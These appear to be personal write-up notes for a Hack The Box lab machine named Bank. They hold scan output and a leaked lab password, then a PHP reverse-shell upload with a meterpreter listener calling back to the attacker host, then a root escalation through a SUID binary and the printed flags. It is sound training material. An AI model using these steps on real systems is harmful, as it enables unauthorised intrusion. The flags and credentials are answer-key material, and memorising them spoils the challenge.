Bank IP: 10.10.10.29


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
53/tcp open  domain  syn-ack
80/tcp open  http    syn-ack



nmap:

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| vulners: 
|   cpe:/a:openbsd:openssh:6.6.1p1: 
|       CVE-2015-5600   8.5     https://vulners.com/cve/CVE-2015-5600
|       CVE-2015-6564   6.9     https://vulners.com/cve/CVE-2015-6564
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
|       CVE-2015-5352   4.3     https://vulners.com/cve/CVE-2015-5352
|_      CVE-2015-6563   1.9     https://vulners.com/cve/CVE-2015-6563
53/tcp open  domain  syn-ack ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux)
| vulners: 
|   cpe:/a:isc:bind:9.9.5-3ubuntu0.14: 
|       PACKETSTORM:138960      7.8     https://vulners.com/packetstorm/PACKETSTORM:138960      *EXPLOIT*
|       PACKETSTORM:132926      7.8     https://vulners.com/packetstorm/PACKETSTORM:132926      *EXPLOIT*
|       EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:BE4F638B632EA0754155A27ECC4B3D3F    *EXPLOIT*
|       EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F    7.8     https://vulners.com/exploitpack/EXPLOITPACK:46DEBFAC850194C04C54F93E0DFF5F4F    *EXPLOIT*
|       EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74    7.8     https://vulners.com/exploitpack/EXPLOITPACK:09762DB0197BBAAAB6FC79F24F0D2A74    *EXPLOIT*
|       EDB-ID:40453    7.8     https://vulners.com/exploitdb/EDB-ID:40453      *EXPLOIT*
|       EDB-ID:37723    7.8     https://vulners.com/exploitdb/EDB-ID:37723      *EXPLOIT*
|       CVE-2016-2776   7.8     https://vulners.com/cve/CVE-2016-2776
|       CVE-2015-5722   7.8     https://vulners.com/cve/CVE-2015-5722
|       CVE-2015-5477   7.8     https://vulners.com/cve/CVE-2015-5477
|       1337DAY-ID-25325        7.8     https://vulners.com/zdt/1337DAY-ID-25325        *EXPLOIT*
|       1337DAY-ID-23970        7.8     https://vulners.com/zdt/1337DAY-ID-23970        *EXPLOIT*
|       1337DAY-ID-23960        7.8     https://vulners.com/zdt/1337DAY-ID-23960        *EXPLOIT*
|       1337DAY-ID-23948        7.8     https://vulners.com/zdt/1337DAY-ID-23948        *EXPLOIT*
|       EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2    7.2     https://vulners.com/exploitpack/EXPLOITPACK:D6DDF5E24DE171DAAD71FD95FC1B67F2    *EXPLOIT*
|       EDB-ID:42121    7.2     https://vulners.com/exploitdb/EDB-ID:42121      *EXPLOIT*
|       CVE-2017-3141   7.2     https://vulners.com/cve/CVE-2017-3141
|       CVE-2015-5986   7.1     https://vulners.com/cve/CVE-2015-5986
|       CVE-2021-25216  6.8     https://vulners.com/cve/CVE-2021-25216
|       CVE-2020-8625   6.8     https://vulners.com/cve/CVE-2020-8625
|       PACKETSTORM:157836      5.0     https://vulners.com/packetstorm/PACKETSTORM:157836      *EXPLOIT*
|       FBC03933-7A65-52F3-83F4-4B2253A490B6    5.0     https://vulners.com/githubexploit/FBC03933-7A65-52F3-83F4-4B2253A490B6  *EXPLOIT*
|       CVE-2021-25219  5.0     https://vulners.com/cve/CVE-2021-25219
|       CVE-2021-25215  5.0     https://vulners.com/cve/CVE-2021-25215
|       CVE-2020-8616   5.0     https://vulners.com/cve/CVE-2020-8616
|       CVE-2018-5740   5.0     https://vulners.com/cve/CVE-2018-5740
|       CVE-2017-3145   5.0     https://vulners.com/cve/CVE-2017-3145
|       CVE-2016-9131   5.0     https://vulners.com/cve/CVE-2016-9131
|       CVE-2016-8864   5.0     https://vulners.com/cve/CVE-2016-8864
|       CVE-2020-8617   4.3     https://vulners.com/cve/CVE-2020-8617
|       CVE-2019-6465   4.3     https://vulners.com/cve/CVE-2019-6465
|       CVE-2018-5743   4.3     https://vulners.com/cve/CVE-2018-5743
|       CVE-2017-3143   4.3     https://vulners.com/cve/CVE-2017-3143
|       CVE-2017-3142   4.3     https://vulners.com/cve/CVE-2017-3142
|       CVE-2017-3136   4.3     https://vulners.com/cve/CVE-2017-3136
|       CVE-2016-2775   4.3     https://vulners.com/cve/CVE-2016-2775
|       1337DAY-ID-34485        4.3     https://vulners.com/zdt/1337DAY-ID-34485        *EXPLOIT*
|       CVE-2021-25214  4.0     https://vulners.com/cve/CVE-2021-25214
|       CVE-2020-8622   4.0     https://vulners.com/cve/CVE-2020-8622
|       CVE-2016-6170   4.0     https://vulners.com/cve/CVE-2016-6170
|       CVE-2018-5745   3.5     https://vulners.com/cve/CVE-2018-5745
|       PACKETSTORM:142800      0.0     https://vulners.com/packetstorm/PACKETSTORM:142800      *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TSIG-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TSIG- *EXPLOIT*
|       MSF:AUXILIARY-DOS-DNS-BIND_TKEY-        0.0     https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TKEY- *EXPLOIT*
|       CVE-2022-38177  0.0     https://vulners.com/cve/CVE-2022-38177
|       CVE-2022-2795   0.0     https://vulners.com/cve/CVE-2022-2795
|_      1337DAY-ID-27896        0.0     https://vulners.com/zdt/1337DAY-ID-27896        *EXPLOIT*
80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /login.php: Possible admin folder
|_  /inc/: Potentially interesting directory w/ listing on 'apache/2.4.7 (ubuntu)'
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       PACKETSTORM:127546      6.8     https://vulners.com/packetstorm/PACKETSTORM:127546      *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       1337DAY-ID-22451        6.8     https://vulners.com/zdt/1337DAY-ID-22451        *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
|       SSV:61874       5.0     https://vulners.com/seebug/SSV:61874    *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2014-0098   5.0     https://vulners.com/cve/CVE-2014-0098
|       CVE-2013-6438   5.0     https://vulners.com/cve/CVE-2013-6438
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       SSV:87152       4.3     https://vulners.com/seebug/SSV:87152    *EXPLOIT*
|       PACKETSTORM:127563      4.3     https://vulners.com/packetstorm/PACKETSTORM:127563      *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|       PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
|       CVE-2023-25690  0.0     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-37436  0.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-36760  0.0     https://vulners.com/cve/CVE-2022-36760
|_      CVE-2006-20001  0.0     https://vulners.com/cve/CVE-2006-20001
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel







nikto -h bank.htb                                                                                                                                                                            1 ⨯
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.29
+ Target Hostname:    bank.htb
+ Target Port:        80
+ Start Time:         2023-03-31 07:52:09 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.21
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie HTBBankAuth created without the httponly flag
+ Root page / redirects to: login.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7786 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-03-31 08:03:01 (GMT-4) (652 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested



 gobuster dir  -u http://bank.htb  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://bank.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/03/31 08:03:01 Starting gobuster
===============================================================
/uploads (Status: 301)
/assets (Status: 301)
/inc (Status: 301)
/server-status (Status: 403)
/balance-transfer (Status: 301)
===============================================================
2023/03/31 08:06:19 Finished
===============================================================


site on port 80 redirects to a log in, but we dont have credentials. if we visit /balance-transfer we are given a list of files that have some encripted credentials. if we search for the smallest file, there we find some unencrypted credentials that we can use to log in at bank.htb


--ERR ENCRYPT FAILED
+=================+
| HTB Bank Report |
+=================+

===UserAccount===
Full Name: Christos Christopoulos
Email: chris@bank.htb
Password: !##HTBB4nkP4ssw0rd!##
CreditCards: 5
Transactions: 39
Balance: 8842803 .
===UserAccount===


From here, we go to the support tab, where we can upload a file. we will generate a php shell with msvenom and then we will upload it.

we set up a meterpreter listener, and then we navigate to /uploads/writeup.htb to get the shell

msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Sending stage (39927 bytes) to 10.10.10.29
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.29:49446) at 2023-03-31 08:18:21 -0400



use flag;

meterpreter > cat user.txt
3f6c9d7fd29e43377991179c11741e44


PRIVESC

upload linenum.sh


[-] SUID files:
-rwsr-xr-x 1 root root 112204 Jun 14  2017 /var/htb/bin/emergency
-rwsr-xr-x 1 root root 5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 daemon daemon 46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root root 35916 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 44620 May 17  2017 /usr/bin/chfn



running /var/htb/bin/emergency will give us root permissions:

www-data@bank:/tmp$ cd /var/htb/bin
cd /var/htb/bin
www-data@bank:/var/htb/bin$ ls
ls
emergency
www-data@bank:/var/htb/bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@bank:/var/htb/bin$ ./emergency
./emergency
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
2558ae225ee4cd8ad81a9d0dcf601961
# 



